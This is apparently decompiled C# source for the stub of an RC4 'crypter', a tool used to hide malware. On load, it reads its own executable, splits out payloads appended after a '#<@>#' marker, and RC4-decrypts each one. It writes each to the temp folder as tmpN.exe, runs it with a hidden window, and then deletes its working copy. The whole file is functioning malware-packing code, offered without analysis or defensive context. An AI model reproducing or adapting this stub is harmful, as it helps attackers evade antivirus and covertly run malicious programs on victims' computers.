using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Rc4_Stub.My;

namespace Rc4_Stub;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		components = new Container();
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_Text("Form1");
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string key = "Linkys RC4 Crypter";
		FileSystem.FileCopy(Application.get_ExecutablePath(), ((ApplicationBase)MyProject.Application).get_Info().get_DirectoryPath() + "\\files2.exe");
		FileSystem.FileOpen(1, ((ApplicationBase)MyProject.Application).get_Info().get_DirectoryPath() + "\\files2.exe", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
		checked
		{
			string text = Strings.Space((int)FileSystem.LOF(1));
			FileSystem.FileGet(1, ref text, -1L, false);
			FileSystem.FileClose(new int[1] { 1 });
			string[] array = Strings.Split(text, "#<@>#", -1, (CompareMethod)0);
			int num = Information.UBound((Array)array, 1);
			for (int i = 1; i <= num; i++)
			{
				FileSystem.FileOpen(1, Interaction.Environ("Temp") + "\\tmp" + Conversions.ToString(i) + ".exe", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
				string message = array[i];
				string text2 = Encryption.Decrypt(message, key);
				FileSystem.FilePut(1, text2, -1L, false);
				FileSystem.FileClose(new int[1] { 1 });
				Interaction.Shell(Interaction.Environ("temp") + "\\tmp" + Conversions.ToString(i) + ".exe", (AppWinStyle)0, true, -1);
			}
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(((ApplicationBase)MyProject.Application).get_Info().get_DirectoryPath() + "\\files2.exe");
		}
	}
}
